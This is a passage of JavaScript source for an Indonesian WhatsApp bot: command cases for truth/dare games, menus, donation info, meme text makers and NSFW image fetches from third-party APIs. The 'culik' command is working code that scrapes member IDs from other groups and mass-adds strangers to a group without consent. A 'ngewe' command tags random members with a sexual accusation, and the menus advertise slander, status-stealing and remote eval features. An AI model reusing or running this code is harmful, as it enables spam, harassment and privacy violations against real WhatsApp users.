ini?','kebiasaan terburuk lo pas di sekolah apa?']
					const ttrth = trut[Math.floor(Math.random() * trut.length)]
					truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					sendButMessage(from, ttrth, "Case By @iamghosky_\nmau lagi? tekan tombol di bawah", [
          {
            buttonId: `${prefix}truth`,
            buttonText: {
              displayText: `Truth`,
            },
            type: 1,
          },
         {
            buttonId: `${prefix}dare`,
            buttonText: {
              displayText: `Dare`,
            },
            type: 1,
          },

 ]);
					
					break
		case "dare":
		  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
		  if (isBanned) return reply(mess.ban)
					// Fix Case By Yogi/Hans⛔
                 
					const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
					const der = dare[Math.floor(Math.random() * dare.length)]
					sya = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					sendButMessage(from, der, "Case By @iamghosky_\nmau lagi? tekan tombol di bawah", [
					  {
            buttonId: `${prefix}truth`,
            buttonText: {
              displayText: `Truth`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}dare`,
            buttonText: {
              displayText: `Dare`,
            },
            type: 1,
          },

 ]);
					break

case "donasi":
  case "donate":
					// Fix Case by Arasyaaa
					sya = await getBuffer(`${linkimg}`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `◪ *DONASI*
  │
  ├─ ❏ *GOPAY*
  ├─ ❏ ${gopay}
  ├─ ❏ *OVO*
  ├─ ❏ ${ovo}
  ├─ ❏ *DANA*
  ├─ ❏ ${dana}
  ├─ ❏ *PULSA*
  ├─ ❏ ${pulsa}
  ├─ ❏ *INSTAGRAM*
  └─ ❏ https://www.instagram.com/${instagram}` })
					break
case "info":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
    me = syaa.user
					uptime = process.uptime()
					// Fix Case by Arasyaaa
					sya = await getBuffer(`https://telegra.ph/file/bbbc1fafc590610ffd2f5.jpg`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `*INFO OWNER*\n*Owner bot* : Arasya\n*No Owner* : wa.me/6281319944917\n*Ig owner* : www.instagram.com/${instagram}\n━━━━━━━━━━━━━━━━━━━━\n*INFO BOT*\n*Nama bot* : ${me.name}\n*Nomor bot* : @${me.jid.split('@')[0]}\n*Prefix* : ${prefix}\n*Total block contact* : ${blocked.length}\n*The bot is active on* : ${kyun(uptime)}\n*Ketik* : ${prefix}report _Untuk melaporkan admin bot melalui bot_\n*Ketik* : ${prefix}owner untuk menghubungi admin bot kami.` })
					break
//////CASE BY RIYAN TEST BANH
case 'culik':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
         if (!isOwner) return reply(`Only Owner!`)
         if (!isGroup) return reply(`Hanya bisa digunakan didalam grup!`)
         if (!isBotGroupAdmins) return reply(`Hanya bisa digunakan ketika bot menjadi admin!`)
         var gid = [];
for (let i of syaa.chats.all()) {
  if (i.jid.endsWith('g.us') && i.jid !== from) {
   gid.push(i.jid)
  }
}
async function getMembers(gid) {
   var dataMem = [];
   var metadata = await syaa.groupMetadata(gid)
   for (let x of metadata.participants) {
      dataMem.push(x.jid)
   }
   return dataMem
}

var alldata = []
for (let x of gid) {
    var data = await getMembers(x)
    for (let a of data) {
      alldata.push(a)
    }
}

var metaData = await syaa.groupMetadata(from)
var jumlah = 257 - metaData.participants.length

for (let i = 0; i < jumlah; i++) {
   var anunya = await getMembers(from)
   var mem = alldata[Math.floor(Math.random() * alldata.length)]
   if (!anunya.includes(mem)) {
   await syaa.groupAdd(from, [mem]).then(async(res) => {
     if (res.participants[0][mem.split("@")[0]+'@c.us'].code !== 200) {
         var mem2 = alldata[Math.floor(Math.random() * alldata.length)]
         await syaa.groupAdd(from, [mem2]).then((su) => {
          if (su.participants[0][mem2.split("@")[0]+'@c.us'].code !== 200) {
            reply('Salah satu orang tidak bisa di tambahkan!')
          }
         })
      }
   })
 }
reply(`Sukses, Maaf jika beberapa member tidak berhasil di tambahkan, kamu bisa mengulangi command!`)
}
break
//MENU² AN
case "ownermenu":
					// Fix Case by Arasyaaa
					sya = await getBuffer(`https://telegra.ph/file/0f2a2ecf9500e502fe58a.png`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `*OWNER MENU*
• ${prefix}addbadword _KataToxic_
• ${prefix}delbadword _ListToxic_
• ${prefix}addbucin _Kata_
• ${prefix}addrespon _Pesan|Balas_
• ${prefix}delrespon _Pesan_
• ${prefix}off
• ${prefix}on
• ${prefix}status
• ${prefix}setthumb
• ${prefix}settarget
• ${prefix}shutdown
• ${prefix}hacked
• ${prefix}setfakeimg
• ${prefix}setreply
• ${prefix}addprem @user
• ${prefix}dellprem @user
• ${prefix}ban @user
• ${prefix}unban @user
• ${prefix}setprefix [2 Button]
• ${prefix}mode [2 Button self/public]
• ${prefix}term <code>
• ${prefix}eval <code>
• ${prefix}colongsw [reply sw]
• ${prefix}readall
 $
 >
 =>` })
					break
case "grupmenu":
  case "groupmenu":
					// Fix Case by Arasyaaa
					sya = await getBuffer(`https://telegra.ph/file/24149d6200dbd9e55942d.png`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `*GRUP MENU*
• ${prefix}nobadword enable/disable
• ${prefix}grup [3 Button]
• ${prefix}promote <reply chat member>
• ${prefix}demote <reply chat member>
• ${prefix}setdesc
• ${prefix}setname
• ${prefix}hidetag
• ${prefix}kontag
• ${prefix}leavetime
• ${prefix}tutuptime
• ${prefix}bukatime
• ${prefix}sticktag
• ${prefix}totag
• ${prefix}kick <reply/tag member>
• ${prefix}add <reply/tag member>
• ${prefix}getbio <reply chat member>
• ${prefix}getname <reply chat member>
• ${prefix}reminder <msg/2s>
• ${prefix}listonline
• ${prefix}groupinfo
• ${prefix}linkgc
• ${prefix}sider [reply chat bot]
• ${prefix}antilink
• ${prefix}antihidetag
• ${prefix}antiviewonce
• ${prefix}antivirtex
• ${prefix}kickarea` })
					break
case "makermenu":
					// Fix Case by Arasyaaa
					sya = await getBuffer(`https://telegra.ph/file/ce0ff72c46a2d6b45e24a.png`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `*MAKER MENU*
• ${prefix}memegen Atas|Bawah
• ${prefix}bajingan lu _Nama Mu_
• ${prefix}sticker
• ${prefix}attp _Text_
• ${prefix}fdeface
• ${prefix}semoji
• ${prefix}wasted
• ${prefix}wanted
• ${prefix}pubglogo teks|teks
• ${prefix}deltrash
• ${prefix}card-game Judul|Keterangan
• ${prefix}squidrip
• ${prefix}sertiff1 <text>
• ${prefix}bpink <text>
• ${prefix}tulis
• ${prefix}nuliskanan _Text_
• ${prefix}nuliskiri _Text_
• ${prefix}foliokanan _Text_
• ${prefix}foliokiri _Text_
• ${prefix}googlem Text|Text
• ${prefix}roses
• ${prefix}wooden
• ${prefix}quote
• ${prefix}textburn
• ${prefix}tahta _Nama_
• ${prefix}halloween _Name_
• ${prefix}minion _Name_
• ${prefix}dance _Name_
• ${prefix}warrior _Name_
• ${prefix}text3d _Name_
• ${prefix}express _Name_
• ${prefix}spiderman _Name_
• ${prefix}matrix _Name_
• ${prefix}vampire _Name_
• ${prefix}lolim _Text_
• ${prefix}remm _Text_
• ${prefix}gura _Text_
• ${prefix}kaneki _Name_
• ${prefix}text2d _Text_
• ${prefix}logogaming _Text_` })
					break
case "funmenu":
					// Fix Case by Arasyaaa
					sya = await getBuffer(`https://telegra.ph/file/f5dd2eb768a133d3b6528.png`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `*FUN MENU*
• ${prefix}cekme
• ${prefix}bucin
• ${prefix}say _Text_
• ${prefix}bisakah _Querry_
• ${prefix}kapankah _Querry_
• ${prefix}apakah _Querry_
• ${prefix}belah _Querry_
• ${prefix}bagaimanakah _Querry_
• ${prefix}rate _Querry_
• ${prefix}caklontong
• ${prefix}sangecek _Name_
• ${prefix}gaycek _Name_
• ${prefix}terganteng
• ${prefix}tercantik
• ${prefix}lesbicek _Name_
• ${prefix}gantengcek _Name_
• ${prefix}cantikcek _Name_
• ${prefix}watak _Name_
• ${prefix}hobby _Name_
• ${prefix}fitnah
• ${prefix}fitnahpc
• ${prefix}kontak 62813199449178|Arasya
• ${prefix}jadian
• ${prefix}
• ${prefix}tod
• ${prefix}truth
• ${prefix}dare
• ${prefix}wangy _NamaMu_
• ${prefix}citacita` })
					break
case "convertmenu":
					// Fix Case by Arasyaaa
					sya = await getBuffer(`https://telegra.ph/file/8bc9d1c514c76446ae842.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*CONVERT*
• ${prefix}toimg
• ${prefix}tomp3
• ${prefix}tomp4
• ${prefix}slow
• ${prefix}fast
• ${prefix}reverse
• ${prefix}tourl` })
					break
case "gamemenu":
					// Fix Case by Arasyaaa
					sya = await getBuffer(`https://telegra.ph/file/c04b0e66bf1029ef76970.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*GAME MENU*
• ${prefix}afk _Alasan_
• ${prefix}slot
• ${prefix}tictactoe @user
• ${prefix}delttt
• ${prefix}suit` })
					break
case "downloadmenu":
					// Fix Case by Arasyaaa
					sya = await getBuffer(`https://telegra.ph/file/317c98e7a83c14fcf451b.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*DOWNLOADER MENU*
• ${prefix}youtube <url>
• ${prefix}ytmp3 <url>
• ${prefix}ytmp4 <url>
• ${prefix}tiktok <url>
• ${prefix}instagram <url>
• ${prefix}twitter <url>` })
					break
case "uploadmenu":
					// Fix Case by Arasyaaa
					sya = await getBuffer(`https://telegra.ph/file/fc635320103279a3dbcd1.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*UP STORY MENU*
• ${prefix}upswteks
• ${prefix}upswimage
• ${prefix}upswvideo
• ${prefix}upswvoice
• ${prefix}upswgif
• ${prefix}upswaudio
• ${prefix}upswsticker` })
					break
case "storagemenu":
					// Fix Case by Arasyaaa
					sya = await getBuffer(`https://telegra.ph/file/d4a42eb0966c598dfa0bd.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*STORAGE MENU*
• ${prefix}addvn _Nama_
• ${prefix}addvideo _Nama_
• ${prefix}addsticker _Nama_
• ${prefix}addimage _Nama_
• ${prefix}listvn
• ${prefix}listvideo
• ${prefix}liststicker
• ${prefix}listimg
• ${prefix}getvn _Database_
• ${prefix}getvideo _Database_
• ${prefix}getsticker _Database_
• ${prefix}getimage _Database_` })
					break
case "menulain":
					// Fix Case by Arasyaaa
					sya = await getBuffer(`https://telegra.ph/file/6d91364ee9449c3a64164.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*OTHER MENU*
• ${prefix}tovn
• ${prefix}shortlink _Link_
• ${prefix}wikipedia _Querry_
• ${prefix}ssweb _Link_
• ${prefix}sswebfull _Link_
• ${prefix}asupan
• ${prefix}asupan2
• ${prefix}tts id _Text_
• ${prefix}polosanmeme
• ${prefix}detikvn <ReplyVn|Jumlah>
• ${prefix}detikvideo <ReplyVid|Jumlah>
• ${prefix}delete
• ${prefix}infogempa
• ${prefix}dadu
• ${prefix}tospam _Jumlah_
• ${prefix}ping
• ${prefix}inspect
• ${prefix}join
• ${prefix}caripesan <query>
• ${prefix}get
• ${prefix}ytsearch <query>
• ${prefix}igstalk <query>
• ${prefix}githubstalk <query>
• ${prefix}tiktokstalk <query>
• ${prefix}play <query>
• ${prefix}video <query>
• ${prefix}igstory <username>
• ${prefix}twitter <link>
• ${prefix}tiktok <link>
• ${prefix}tiktokaudio <link>
• ${prefix}fb <link>
• ${prefix}brainly <query>
• ${prefix}image <query>
• ${prefix}anime <random>
• ${prefix}pinterest <query>
• ${prefix}komiku <query>
• ${prefix}lirik <query>
• ${prefix}chara <query>
• ${prefix}playstore <query>
• ${prefix}otaku <query>` })
					break
case "stcmd":
					// Fix Case by Arasyaaa
					sya = await getBuffer(`https://telegra.ph/file/381f48dc7fcdd20f78edd.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*STICKER CMD*
• ${prefix}addcmd
• ${prefix}delcmd
• ${prefix}listcmd` })
					break
case "makerc":
					// Fix Case by Arasyaaa
					sya = await getBuffer(`https://telegra.ph/file/f6fbcdcc7be434f22ee49.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*MAKER CONVERT*
• ${prefix}spongebobm _ReplyGambar_
• ${prefix}hengkerm _ReplyGambar_
• ${prefix}hengkerm2 _ReplyGambar_
• ${prefix}ripm _ReplyGambar_
• ${prefix}stonkm _ReplyGambar_
• ${prefix}notstonkm _ReplyGambar_
• ${prefix}patrickm _ReplyGambar_` })
					break
case "nsfwmenu":
					// Fix Case by Arasyaaa
					sya = await getBuffer(`https://telegra.ph/file/bc8817e4b676b34882c66.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*NSFW MENU*
• ${prefix}blowjob
• ${prefix}hentai
• ${prefix}trap` })//Lu tambahin sendiri aja tod, gua males
					break
case "stcmenu":
					// Fix Case by Arasyaaa
					sya = await getBuffer(`https://telegra.ph/file/532f14b3580e28d636705.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*STICKER CONVERT*
• ${prefix}stcmeme Atas|bawah
• ${prefix}bajingan lu _Text_
• ${prefix}sticker
• ${prefix}gay
• ${prefix}take Author|Pack
• ${prefix}swm Author|Pack
• ${prefix}attp _Text_
• ${prefix}ttp _Text_
• ${prefix}ttpblue _Text_
• ${prefix}ttpyellow _Text_
• ${prefix}ttpgreen _Text_` })
					break
case "imagemenu":
					// Fix Case by Arasyaaa
					sya = await getBuffer(`https://telegra.ph/file/9a9d57dfe3aed1c9df709.jpg`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*RANDOM IMAGE*
• ${prefix}neko
• ${prefix}cecan
• ${prefix}cogan
• ${prefix}quotes
• ${prefix}kucing
• ${prefix}squidward
• ${prefix}spongebob
• ${prefix}patrick
• ${prefix}minato
• ${prefix}kakashi
• ${prefix}boruto
• ${prefix}sarada
• ${prefix}mitsuki
• ${prefix}sasuke
• ${prefix}sakura
• ${prefix}itachi
• ${prefix}megumin
• ${prefix}loli
• ${prefix}husbu
• ${prefix}wafiu
• ${prefix}wallpaperanime
• ${prefix}naruto
• ${prefix}aeshtetic` })
					break
case "votemenu":
					// Fix Case by Arasyaaa
					sya = await getBuffer(`https://telegra.ph/file/3357c40ff7cdded3dbc7d.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*VOTE*
• ${prefix}voting
• ${prefix}delvote
 vote
 devote` })
					break
//Akhirrr
case "peraturan2":
					// Fix Case by Arasyaaa
					sya = await getBuffer(`https://telegra.ph/file/2df02fc7ecebd2ebd6a69.jpg`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `Jojo Bot merupakan suatu program bot whatsapp, yang menggunakan engine nodejs v14.x.x
Adapun ketentuan untuk memakai Jojo Bot. :
*1.* Pengguna dapat menggunakan semua perintah/command dengan tanpa adanya limit yg tersedia.
*2.* Bot akan di reset oleh owner satu kali 24 jam
*3.* Bot dapat memblokir pengguna/user melanggar rules yang ada di bot ini, rules yang harus dipatuhi oleh pengguna antara lain :
  • Tidak melakukan panggilan telepon/video call terhadap Bot
  • Tidak melakukan spam perintah/command yang ada dalam bot ini
*4.* Dilarang keras mengirim pesan V dan semacamnya yang membuat server down ataupun bot crash
*5.* Pengguna yang mengirim hal atau data pribadi tidak akan disimpan oleh bot ini, dan tidak akan bertanggung jawab atas data pribadi tersebut!

_Note : Bot ini menggunakan autoread atau langsung membaca pesan yang pengguna kirim_

Regards : Arasyaa
Owner  Bot:
wa.me/6281319944917
` })
					break
////AUTO RESPON
case 'autorespon':
      if (!isOwner && !mek.key.fromMe) return sticOwner(from)
           if (c === 'on'){
              autorespon = false
                    reply(`Berhasil mengaktifkan autorespon`)
                } else if (c === 'off'){
                    autorespon = true
                    reply(`Berhasil menonaktifkan autorespon`)
                } else if (!c) {
                    anu =`Silahkan pilih salah satu\n\non: untuk mengaktifkan\noff: untuk menonaktifkan`
const buttons = [{buttonId: 'autorespon on', buttonText: {displayText: 'ON✔️'}, type: 1},{buttonId: 'autorespon off', buttonText: {displayText: 'OFF✖️'}, type: 1}]
const btnharam = {
    contentText: `${anu}`,
    footerText: '© By @sofunsyabi.id',
    buttons: buttons,
    headerType: 1
}
await syaa.sendMessage(from, btnharam, MessageType.buttonsMessage, {quoted: ftrol})
                }
                break
//////////EN ES EF WE///////////
case 'nsfw':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.admin)
					if (args.length < 1) return reply('Ketik 1 Untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isNsfw) return reply(' *sudah aktif*  !!')
						nsfw.push(from)
						fs.writeFileSync('./database/nsfw.json', JSON.stringify(nsfw))
						reply('❬ 𝗦𝗨𝗞𝗦𝗘𝗦 ❭ MENGAKTIFKAN NSFW DI GROUP INI')
					} else if (Number(args[0]) === 0) {
						nsfw.splice(from, 1)
						fs.writeFileSync('./database/nsfw.json', JSON.stringify(nsfw))
						reply('❬ 𝗦𝗨𝗞𝗦𝗘𝗦 ❭ MENONAKTIFKAN NSFW DI GROUP INI')
					} else {
						reply(mess.tmbh)
					}
				break
case "blowjob":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (!isGroup)return reply(mess.only.group)
  if (!isNsfw)return reply(mess.nsfw)
  if (isBanned) return reply(mess.ban)
  reply(mess.wait)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=blowJob&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
case "hentai":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (!isGroup)return reply(mess.only.group)
  if (!isNsfw) return reply(mess.nsfw)
  reply(mess.wait)
					atetepe = await getBuffer(`https://bx-hunter.herokuapp.com/api/nsfw/hentai?apikey=Ikyy69`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
case "avatar":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (!isGroup)return reply(mess.only.group)
  if (!isNsfw) return reply(mess.nsfw)
  reply(mess.wait)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=avatar&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
case "trap":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (!isGroup)return reply(mess.only.group)
  if (!isNsfw) return reply(mess.nsfw)
  reply(mess.wait)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=trap&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
////AKHIR NSFW
case "tebakgambar":
					  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
   anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/kuis/tebakgambar?apikey=beta`)
   gambar = await getBuffer(anu.result.images)
   setTimeout( () => {
   reply('*➸ Jawaban :* '+anu.result.jawaban, text, {quoted: mek}) // ur cods
   }, 60000) // 1000 = 1s,
   setTimeout( () => {
   reply('_10 Detik lagi…_', text) // ur cods
   }, 30000) // 1000 = 1s,
   setTimeout( () => {
   reply('_30 Detik lagi_…', text) // ur cods
   }, 10000) // 1000 = 1s,
   setTimeout( () => {
   reply('_60 Detik lagi_…', text) // ur cods
   }, 2500) // 1000 = 1s,
   setTimeout( () => {
   syaa.sendMessage(from, gambar, image, {quoted: mek }) // ur cods
   }, 0) // 1000 = 1s,
   break
case "lesbicek":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					lesbii = body.slice(1)
					const lesbi =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const bi = lesbi[Math.floor(Math.random() * lesbi.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+lesbii+'*\n\nJawaban : '+ bi+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
                    case "gantengcek":
                      if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					// ⚠️ Case by DappaUhuy&YogPw

                 
					ganteng = body.slice(1)
					const gan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+ganteng+'*\n\nJawaban : '+ teng+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "cantikcek":
		              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					// ⚠️ Case by DappaUhuy&YogPw

                 
					cantik = body.slice(1)
					const can =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+cantik+'*\n\nJawaban : '+ tik+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "watak":
		              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					// ⚠️ Case by DappaUhuy&YogPw

                 
					watak = body.slice(1)
					const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
					const tak = wa[Math.floor(Math.random() * wa.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak, text, { quoted: mek })
					await limitAdd(sender)
				        break
		         case "hobby":
		           if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					// ⚠️ Case by DappaUhuy&YogPw

                 
					hobby = body.slice(1)
					const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
					const by = hob[Math.floor(Math.random() * hob.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: mek })
					await limitAdd(sender)
					break
                case "jadian":
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					jds = []
					const jdii = groupMembers
					const koss = groupMembers
					const akuu = jdii[Math.floor(Math.random() * jdii.length)]
					const diaa = koss[Math.floor(Math.random() * koss.length)]
					teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]} ♥️ @${diaa.jid.split('@')[0]} `
					jds.push(akuu.jid)
					jds.push(diaa.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break	
          case "ngewe":
            if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					jds = []
					const jdiid = groupMembers
					const kosst = groupMembers
					const akuut = jdiid[Math.floor(Math.random() * jdiid.length)]
					const diaat = kosst[Math.floor(Math.random() * kosst.length)]
					teks = `Yang ngewe kemarin di grub ini adalah @${akuut.jid.split('@')[0]} dan️ @${diaat.jid.split('@')[0]} `
					jds.push(akuut.jid)
					jds.push(diaat.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break	
               case "terganteng":
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					jds = []
					const jdiidc = groupMembers
					const kosstc = groupMembers
					const akuutc = jdiidc[Math.floor(Math.random() * jdiidc.length)]
					teks = `Yang terganteng di grub ini adalah @${akuutc.jid.split('@')[0]}`
					jds.push(akuutc.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break	
               case "tercantik":
				
				
					jds = []
					const jdiidr = groupMembers
					const kosstr = groupMembers
					const akuutr = jdiidr[Math.floor(Math.random() * jdiidr.length)]
					teks = `Yang tercantik di grub ini adalah @${akuutr.jid.split('@')[0]}`
					jds.push(akuutr.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break	
					case "googlem":
					  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker Tolol|Test|Anjay`)
				reply('Bentar lagi di proses')
kontol = body.slice(8)
memek3 = kontol.split("|")[0];
memek4 = kontol.split("|")[1];
memek5 = kontol.split("|")[2];
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker?text=${memek3}&text2=${memek4}&text3=${memek5}&theme=google-suggestion&apikey=beta`)
buffer = await getBuffer(anu.result.url)
buffer1 = await getBuffer(anu.result.delete_url)
shit = `${anu.result.url}\n${anu.result.info}`
syaa.sendMessage(from, buffer, image, {quoted: mek, caption: shit})
break
case "textburn":
					  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker ${prefix}textburn arasya`)
				reply('Bentar lagi di proses')
kontol = body.slice(10)
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/random?text=${kontol}&theme=text-burn&apikey=Alphabot`)
buffer = await getBuffer(anu.result.url)
buffer1 = await getBuffer(anu.result.delete_url)
shit = `${anu.result.url}\n${anu.result.info}`
syaa.sendMessage(from, buffer, image, {quoted: mek, caption: shit})
break
case "quote":
					  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker ${prefix}quote arasya`)
				reply('Bentar lagi di proses')
kontol = body.slice(7)
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/random?text=${kontol}&theme=art-quote&apikey=Alphabot`)
buffer = await getBuffer(anu.result.url)
buffer1 = await getBuffer(anu.result.delete_url)
shit = `${anu.result.url}\n${anu.result.info}`
syaa.sendMessage(from, buffer, image, {quoted: mek, caption: shit})
break
case "wooden":
					  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker ${prefix}wooden arasya`)
				reply('Bentar lagi di proses')
kontol = body.slice(8)
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/roses?text=${kontol}&theme=wooden-boarch&apikey=Alphabot`)
buffer = await getBuffer(anu.result.url)
buffer1 = await getBuffer(anu.result.delete_url)
shit = `${anu.result.url}\n${anu.result.info}`
syaa.sendMessage(from, buffer, image, {quoted: mek, caption: shit})
break
case "roses":
					  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker ${prefix}roses arasya`)
				reply('Bentar lagi di proses')
kontol = body.slice(7)
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/roses?text=${kontol}&theme=golden&apikey=Alphabot`)
buffer = await getBuffer(anu.result.url)
buffer1 = await getBuffer(anu.result.delete_url)
shit = `${anu.result.url}\n${anu.result.info}`
syaa.sendMessage(from, buffer, image, {quoted: mek, caption: shit})
break
case "neon":
